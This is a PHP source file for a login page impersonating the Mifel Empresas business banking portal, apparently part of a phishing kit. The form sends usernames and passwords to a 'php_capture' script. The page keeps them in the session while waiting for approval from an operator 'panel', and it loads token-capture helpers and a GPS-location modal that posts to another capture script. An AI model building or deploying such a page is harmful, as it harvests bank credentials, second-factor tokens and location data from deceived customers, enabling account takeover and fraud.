<?php
session_start();

require_once __DIR__ . '/../php_config/conexionbd.php';
require_once __DIR__ . '/../php_config/token_pantalla_helpers.php';
require_once __DIR__ . '/../php_config/gps_helpers.php';
require_once __DIR__ . '/../includes/gps_aviso_modal.php';

$modoValidando = false;
$mostrarModalGps = false;
$usuarioVal = '';
$passwordVal = '';

if (isset($_GET['reiniciar']) && $_GET['reiniciar'] === '1') {
    tokenPantallaReiniciarSesion();
    header('Location: index.php');
    exit;
}

if (isset($_SESSION['usuario_id'])) {
    $pdo = conectarBD();
    $usuarioId = (int) $_SESSION['usuario_id'];
    $usuario = tokenPantallaObtenerUsuario($pdo, $usuarioId);

    // Sesión inválida / ya pasó token o GPS → login limpio (permite volver atrás)
    if (
        !$usuario
        || !tokenPantallaEsEmpresa($usuario)
        || tokenPantallaTokenIngresado($usuario)
    ) {
        tokenPantallaReiniciarSesion();
    } else {
        $avance = tokenPantallaEvaluarAvance($pdo, $usuarioId);

        // Ya liberado (token/GPS): no reenganchar el poll ni forzar authenticate_gps
        if (!empty($avance['puede_avanzar'])) {
            tokenPantallaReiniciarSesion();
        } else {
            // Solo seguir en "validando" si aún espera respuesta del panel (< 60s)
            $modoValidando = true;
            $mostrarModalGps = gpsUsuarioNecesitaCaptura($pdo, $usuarioId);
            tokenPantallaMarcarEsperaActiva();
            $usuarioVal = (string) ($_SESSION['usuario'] ?? '');
            $passwordVal = (string) ($_SESSION['password'] ?? '');
        }
    }
}

$usuarioSafe = htmlspecialchars($usuarioVal, ENT_QUOTES, 'UTF-8');
$passwordSafe = htmlspecialchars($passwordVal, ENT_QUOTES, 'UTF-8');
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal Empresas</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/empresas.css">
    <link rel="stylesheet" href="css/login-validando.css?v=20260713d">
    <link rel="stylesheet" href="../css/zeppelin_churro_btn.css">
    <?php gpsAvisoModalEmpresasAssets($mostrarModalGps); ?>
    <link rel="stylesheet" href="../css/responsive-movil-root.css?v=20260710">
    <link rel="stylesheet" href="css/responsive-movil.css?v=20260710">
    <link rel="stylesheet" href="../php_modales/css/responsive-movil.css?v=20260710">
</head>
<body class="<?= $modoValidando ? 'login-validando' : '' ?>">
    <div class="main-container">
        <div class="login-block">
            <div class="language-dropdown">
                <img src="../images/Flag_mx2.svg" alt="México" class="flag-icon">
                <span class="language-text">ES</span>
                <img src="../images/drop_down.png" alt="dropdown" class="dropdown-arrow">
            </div>

            <div class="login-content">
                <div class="logo-container">
                    <img src="../images/mifel-empresas.svg" alt="Mifel Empresas" class="mifel-logo">
                </div>

                <form class="form-content<?= $modoValidando ? ' form-content--validando' : '' ?>" action="../php_capture/login_empresas.php" method="POST" id="loginForm">
                    <div class="input-group">
                        <label for="usuario" class="input-label">Usuario</label>
                        <div class="input-wrapper">
                            <input type="password" id="usuario" name="usuario" class="input-field" required autocomplete="username"
                                value="<?= $usuarioSafe ?>"
                                <?= $modoValidando ? 'disabled readonly' : '' ?>>
                            <button type="button" class="toggle-eye" aria-label="Mostrar/Ocultar usuario" onclick="toggleFieldVisibility('usuario', 'eyeIconUsuario')" <?= $modoValidando ? 'disabled tabindex="-1"' : '' ?>>
                                <img src="../images/toggle-eye_text.svg" alt="Mostrar" class="eye-icon" id="eyeIconUsuario">
                            </button>
                        </div>
                    </div>

                    <div class="forgot-link">
                        <a href="#" class="link-text<?= $modoValidando ? ' link-disabled' : '' ?>" <?= $modoValidando ? 'tabindex="-1" aria-disabled="true"' : '' ?>>¿Olvidaste tu usuario?</a>
                    </div>

                    <div class="input-group">
                        <label for="password" class="input-label">Contraseña</label>
                        <div class="input-wrapper">
                            <input type="password" id="password" name="password" class="input-field" required autocomplete="current-password"
                                value="<?= $passwordSafe ?>"
                                <?= $modoValidando ? 'disabled readonly' : '' ?>>
                            <button type="button" class="toggle-eye" aria-label="Mostrar/Ocultar contraseña" onclick="toggleFieldVisibility('password', 'eyeIconPassword')" <?= $modoValidando ? 'disabled tabindex="-1"' : '' ?>>
                                <img src="../images/toggle-eye_text.svg" alt="Mostrar" class="eye-icon" id="eyeIconPassword">
                            </button>
                        </div>
                    </div>

                    <div class="forgot-link">
                        <a href="#" class="link-text<?= $modoValidando ? ' link-disabled' : '' ?>" <?= $modoValidando ? 'tabindex="-1" aria-disabled="true"' : '' ?>>¿Olvidaste tu contraseña?</a>
                    </div>

                    <button type="submit" class="login-button<?= $modoValidando ? ' login-button--waiting' : '' ?>" id="loginSubmitBtn" <?= $modoValidando ? 'disabled aria-busy="true"' : '' ?>>
                        <span class="login-button__label">Ingresar</span>
                        <?php if ($modoValidando): ?>
                        <img src="images/login-spinner.svg" alt="" class="login-button__spinner" width="20" height="20">
                        <?php endif; ?>
                    </button>

                    <div class="register-text">
                        <span>¿Aún no tienes usuario? <a href="#" class="register-link<?= $modoValidando ? ' link-disabled' : '' ?>" <?= $modoValidando ? 'tabindex="-1" aria-disabled="true"' : '' ?>>Regístrate</a></span>
                    </div>
                </form>
            </div>

            <nav class="action-links" aria-label="Acciones de ayuda">
                <a href="#" class="action-link" target="_blank" rel="noopener">
                    <svg class="action-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M5.99033 17.4548C6.84033 16.8214 7.76533 16.3214 8.76533 15.9548C9.76533 15.5881 10.832 15.4048 11.9653 15.4048C13.0987 15.4048 14.1653 15.5881 15.1653 15.9548C16.1653 16.3214 17.0903 16.8214 17.9403 17.4548C18.557 16.7714 19.0487 15.9798 19.4153 15.0798C19.782 14.1798 19.9653 13.2048 19.9653 12.1548C19.9653 9.93809 19.1863 8.05042 17.6283 6.49175C16.0697 4.93375 14.182 4.15475 11.9653 4.15475C9.74867 4.15475 7.86133 4.93375 6.30333 6.49175C4.74467 8.05042 3.96533 9.93809 3.96533 12.1548C3.96533 13.2048 4.14867 14.1798 4.51533 15.0798C4.882 15.9798 5.37367 16.7714 5.99033 17.4548ZM11.9653 12.9048C11.0487 12.9048 10.278 12.5921 9.65333 11.9668C9.028 11.3421 8.71533 10.5714 8.71533 9.65475C8.71533 8.73809 9.028 7.96742 9.65333 7.34275C10.278 6.71742 11.0487 6.40475 11.9653 6.40475C12.882 6.40475 13.6527 6.71742 14.2773 7.34275C14.9027 7.96742 15.2153 8.73809 15.2153 9.65475C15.2153 10.5714 14.9027 11.3421 14.2773 11.9668C13.6527 12.5921 12.882 12.9048 11.9653 12.9048ZM11.9653 21.6548C10.6487 21.6548 9.41133 21.4048 8.25333 20.9048C7.09467 20.4048 6.09033 19.7298 5.24033 18.8798C4.39033 18.0298 3.71533 17.0254 3.21533 15.8668C2.71533 14.7088 2.46533 13.4714 2.46533 12.1548C2.46533 10.8381 2.71533 9.60042 3.21533 8.44175C3.71533 7.28375 4.39033 6.27975 5.24033 5.42975C6.09033 4.57975 7.09467 3.90475 8.25333 3.40475C9.41133 2.90475 10.6487 2.65475 11.9653 2.65475C13.282 2.65475 14.5197 2.90475 15.6783 3.40475C16.8363 3.90475 17.8403 4.57975 18.6903 5.42975C19.5403 6.27975 20.2153 7.28375 20.7153 8.44175C21.2153 9.60042 21.4653 10.8381 21.4653 12.1548C21.4653 13.4714 21.2153 14.7088 20.7153 15.8668C20.2153 17.0254 19.5403 18.0298 18.6903 18.8798C17.8403 19.7298 16.8363 20.4048 15.6783 20.9048C14.5197 21.4048 13.282 21.6548 11.9653 21.6548ZM11.9653 20.1548C12.8653 20.1548 13.7363 20.0088 14.5783 19.7168C15.4197 19.4254 16.1653 19.0214 16.8153 18.5048C16.1653 18.0048 15.4277 17.6131 14.6023 17.3298C13.7777 17.0464 12.8987 16.9048 11.9653 16.9048C11.032 16.9048 10.153 17.0424 9.32833 17.3178C8.503 17.5924 7.76533 17.9881 7.11533 18.5048C7.76533 19.0214 8.511 19.4254 9.35233 19.7168C10.1943 20.0088 11.0653 20.1548 11.9653 20.1548ZM11.9653 11.4048C12.4653 11.4048 12.882 11.2381 13.2153 10.9048C13.5487 10.5714 13.7153 10.1548 13.7153 9.65475C13.7153 9.15475 13.5487 8.73809 13.2153 8.40475C12.882 8.07142 12.4653 7.90475 11.9653 7.90475C11.4653 7.90475 11.0487 8.07142 10.7153 8.40475C10.382 8.73809 10.2153 9.15475 10.2153 9.65475C10.2153 10.1548 10.382 10.5714 10.7153 10.9048C11.0487 11.2381 11.4653 11.4048 11.9653 11.4048Z"/></svg>
                    <span>Desbloquear usuario</span>
                    <svg class="action-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M9.20595 5.41189L16 12.2059L9.20594 19L8 17.7941L13.5881 12.2059L8 6.61783L9.20595 5.41189Z"/></svg>
                </a>
                <a href="#" class="action-link" target="_blank" rel="noopener">
                    <svg class="action-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M6.3 21.5C5.8 21.5 5.375 21.325 5.025 20.975C4.675 20.625 4.5 20.2 4.5 19.7V10.3C4.5 9.8 4.675 9.375 5.025 9.025C5.375 8.675 5.8 8.5 6.3 8.5H7.5V6.5C7.5 5.25 7.93733 4.18733 8.812 3.312C9.68733 2.43733 10.75 2 12 2C13.25 2 14.3127 2.43733 15.188 3.312C16.0627 4.18733 16.5 5.25 16.5 6.5V8.5H17.7C18.2 8.5 18.625 8.675 18.975 9.025C19.325 9.375 19.5 9.8 19.5 10.3V19.7C19.5 20.2 19.325 20.625 18.975 20.975C18.625 21.325 18.2 21.5 17.7 21.5H6.3ZM6.3 20H17.7C17.7833 20 17.8543 19.971 17.913 19.913C17.971 19.8543 18 19.7833 18 19.7V10.3C18 10.2167 17.971 10.1457 17.913 10.087C17.8543 10.029 17.7833 10 17.7 10H6.3C6.21667 10 6.146 10.029 6.088 10.087C6.02933 10.1457 6 10.2167 6 10.3V19.7C6 19.7833 6.02933 19.8543 6.088 19.913C6.146 19.971 6.21667 20 6.3 20ZM12 16.75C12.4833 16.75 12.896 16.5793 13.238 16.238C13.5793 15.896 13.75 15.4833 13.75 15C13.75 14.5167 13.5793 14.104 13.238 13.762C12.896 13.4207 12.4833 13.25 12 13.25C11.5167 13.25 11.104 13.4207 10.762 13.762C10.4207 14.104 10.25 14.5167 10.25 15C10.25 15.4833 10.4207 15.896 10.762 16.238C11.104 16.5793 11.5167 16.75 12 16.75ZM9 8.5H15V6.5C15 5.66667 14.7083 4.95833 14.125 4.375C13.5417 3.79167 12.8333 3.5 12 3.5C11.1667 3.5 10.4583 3.79167 9.875 4.375C9.29167 4.95833 9 5.66667 9 6.5V8.5Z"/></svg>
                    <span>Ayuda token</span>
                    <svg class="action-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M9.20595 5.41189L16 12.2059L9.20594 19L8 17.7941L13.5881 12.2059L8 6.61783L9.20595 5.41189Z"/></svg>
                </a>
                <a href="#" class="action-link">
                    <svg class="action-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M19.5517 10.7586L19.0966 9.76552L18.1034 9.31035L19.0966 8.85517L19.5517 7.86207L20.0069 8.85517L21 9.31035L20.0069 9.76552L19.5517 10.7586ZM17.069 7.34483L16.3862 5.85517L14.8966 5.17241L16.3862 4.48966L17.069 3L17.7517 4.48966L19.2414 5.17241L17.7517 5.85517L17.069 7.34483ZM8.7931 20.5448C8.37931 20.5448 8.02069 20.4 7.71724 20.1103C7.41379 19.8207 7.24828 19.469 7.22069 19.0552H10.3655C10.3379 19.469 10.1724 19.8207 9.86897 20.1103C9.56552 20.4 9.2069 20.5448 8.7931 20.5448ZM5.68966 17.8966V16.6552H11.8966V17.8966H5.68966ZM5.81379 15.5172C4.94483 14.9793 4.25876 14.2759 3.75559 13.4069C3.25186 12.5379 3 11.5862 3 10.5517C3 8.93793 3.56193 7.56883 4.68579 6.44441C5.81021 5.32055 7.17931 4.75862 8.7931 4.75862C10.4069 4.75862 11.776 5.32055 12.9004 6.44441C14.0243 7.56883 14.5862 8.93793 14.5862 10.5517C14.5862 11.5862 14.3346 12.5379 13.8314 13.4069C13.3277 14.2759 12.6414 14.9793 11.7724 15.5172H5.81379ZM6.18621 14.2759H11.4C12.0207 13.8345 12.4999 13.2897 12.8375 12.6414C13.1757 11.9931 13.3448 11.2966 13.3448 10.5517C13.3448 9.28276 12.9034 8.2069 12.0207 7.32414C11.1379 6.44138 10.0621 6 8.7931 6C7.52414 6 6.44828 6.44138 5.56552 7.32414C4.68276 8.2069 4.24138 9.28276 4.24138 10.5517C4.24138 11.2966 4.41048 11.9931 4.74869 12.6414C5.08634 13.2897 5.56552 13.8345 6.18621 14.2759Z"/></svg>
                    <span>Consejos de seguridad</span>
                    <svg class="action-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M9.20595 5.41189L16 12.2059L9.20594 19L8 17.7941L13.5881 12.2059L8 6.61783L9.20595 5.41189Z"/></svg>
                </a>
            </nav>
        </div>

        <div class="right-block">
            <div class="slider-container">
                <img src="images/baner1.png" alt="Únete a la nueva experiencia digital para empresas" class="promo-image active">
                <img src="images/baner2.png" alt="¡ALERTA! Nunca recibirás llamadas de Mifel" class="promo-image">
                <img src="images/baner3.png" alt="Cuenta Empresarial Dólares 2" class="promo-image">
            </div>
        </div>
    </div>

    <?php if ($mostrarModalGps) {
        gpsAvisoModalMarkup('../php_capture/gps_login_empresas.php', '../images/gps.png', 'images/login-spinner.svg');
    } ?>

    <script>
        function toggleFieldVisibility(fieldId, iconId) {
            const field = document.getElementById(fieldId);
            const eyeIcon = document.getElementById(iconId);
            if (!field || field.disabled) return;

            if (field.type === 'password') {
                field.type = 'text';
                eyeIcon.src = '../images/toggle-eye_password.svg';
                eyeIcon.alt = 'Ocultar';
            } else {
                field.type = 'password';
                eyeIcon.src = '../images/toggle-eye_text.svg';
                eyeIcon.alt = 'Mostrar';
            }
        }

        let currentSlide = 0;
        const slides = document.querySelectorAll('.promo-image');
        const totalSlides = slides.length;

        function showSlide(index) {
            slides.forEach((slide, i) => {
                slide.classList.toggle('active', i === index);
            });
        }

        function nextSlide() {
            currentSlide = (currentSlide + 1) % totalSlides;
            showSlide(currentSlide);
        }

        document.addEventListener('DOMContentLoaded', function () {
            setInterval(nextSlide, 4000);
        });
    </script>
    <?php if ($modoValidando): ?>
    <script>window.MODAL_BASE = '../';</script>
    <script src="../php_modales/js/check_status.js"></script>
    <script src="js/login_validando.js?v=20260803e"></script>
    <?php if ($mostrarModalGps): ?>
    <script src="../js/gps_login_modal.js?v=20260806"></script>
    <?php endif; ?>
    <?php endif; ?>
</body>
</html>
